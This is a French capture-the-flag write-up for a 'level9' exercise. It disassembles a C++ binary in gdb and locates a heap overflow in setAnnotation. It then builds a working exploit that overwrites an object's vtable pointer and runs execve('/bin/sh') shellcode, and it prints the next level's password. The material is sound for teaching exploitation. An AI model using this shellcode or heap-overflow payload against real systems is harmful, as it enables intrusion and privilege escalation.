# Level9

On observe un exécutable à la racine : `level8`

```bash
$ ./level9

$ ./level9 "Hello World"

$ ./level9 `python -c 'print "A"*200'`
Segmentation fault (core dumped)
```

On cherche donc à comprendre ce que fait l'exécutable

```bash
$ gdb level9 -q
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:      push   ebp
   0x080485f5 <+1>:      mov    ebp,esp
   0x080485f7 <+3>:      push   ebx
   0x080485f8 <+4>:      and    esp,0xfffffff0
   0x080485fb <+7>:      sub    esp,0x20
   0x080485fe <+10>:     cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:     jg     0x8048610 <main+28>
   0x08048604 <+16>:     mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:     call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:     mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:     call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:     mov    ebx,eax
   0x0804861e <+42>:     mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:     mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:     call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:     mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:     mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:     call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:     mov    ebx,eax
   0x08048640 <+76>:     mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:     mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:     call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:     mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:     mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:    mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:    mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:    add    eax,0x4
   0x0804866a <+118>:    mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:    mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:    mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:    mov    DWORD PTR [esp],eax
   0x08048677 <+131>:    call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:    mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:    mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:    mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:    mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:    mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:    mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:    mov    DWORD PTR [esp],eax
   0x08048693 <+159>:    call   edx
   0x08048695 <+161>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:    leave
   0x08048699 <+165>:    ret
End of assembler dump.
(gdb) disas _ZN1NC2Ei
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:     push   ebp
   0x080486f7 <+1>:     mov    ebp,esp
   0x080486f9 <+3>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486fc <+6>:     mov    DWORD PTR [eax],0x8048848
   0x08048702 <+12>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:    mov    edx,DWORD PTR [ebp+0xc]
   0x08048708 <+18>:    mov    DWORD PTR [eax+0x68],edx
   0x0804870b <+21>:    pop    ebp
   0x0804870c <+22>:    ret
End of assembler dump.
(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   ebp
   0x0804870f <+1>:     mov    ebp,esp
   0x08048711 <+3>:     sub    esp,0x18
   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:     mov    DWORD PTR [esp],eax
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:    add    edx,0x4
   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave
   0x08048739 <+43>:    ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir une idée plus claire de `level8`

```bash
$ scp -P 4242 -r level9@192.168.56.102:/home/user/level9/level9 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level9
```

_résultat sauvegardé dans [source.md](source.md)_

```bash
$ ./level9 `python -c 'print "A"*108'`

$ ./level9 `python -c 'print "A"*109'`
Segmentation fault (core dumped)
```

Nous avons assez de place pour mettre un `shellcode`.
Nous partons dans cette direction dans un premier temps.

Nous commencons par regarder où sont stocké les deux objects créé

```gdb
(gdb) break *main+40
Breakpoint 1 at 0x804861c
(gdb) break *main+74
Breakpoint 2 at 0x804863e
(gdb) run `python -c 'print "\x90"*108'`
Starting program: /home/user/level9/level9 `python -c 'print "\x90"*108'`

Breakpoint 1, 0x0804861c in main ()
(gdb) i r eax
eax            0x804a008    134520840
(gdb) c
Continuing.

Breakpoint 2, 0x0804863e in main ()
(gdb) i r eax
eax            0x804a078    134520952
```

Entre les deux adresse, nous avons: <code>0x804a078 - 0x804a008 = 70<sub>16</sub> = 112<sub>10</sub></code> octets a notre disposition. De plus, nous pouvons constater que eax est déréferencé 2 fois

```bash
   0x0804867c <+136>:    mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:    mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:    mov    edx,DWORD PTR [eax]
```

Notre parametre aura la forme: `python -c 'print "StartAddr+0x4" + "StartAddr+0x8" + "\x90"*I + "shellcode" + "StartAddr"`

On peut déjà remplacer `StartAddr` puis retirer StartAddr de `112 octets`, cela nous donne:

`python -c 'print "\x90"*108 + "\x0c\xa0\x04\x08"`

puis remplacer `StartAddr+0x4` et `StartAddr+0x8`.

`python -c 'print "\x10\xa0\x04\x08\x14\xa0\x04\x08" + "\x90"*100 + "\x0c\xa0\x04\x08"'`

il nous reste `100 octets` de disponible, plus qu'à mettre le shellcode et on essaye

```shell
level9:$ ./level9 `python -c 'print "\x10\xa0\x04\x08\x14\xa0\x04\x08" + "\x90"*55 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x0c\xa0\x04\x08"'`
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
Ctrl+D
```
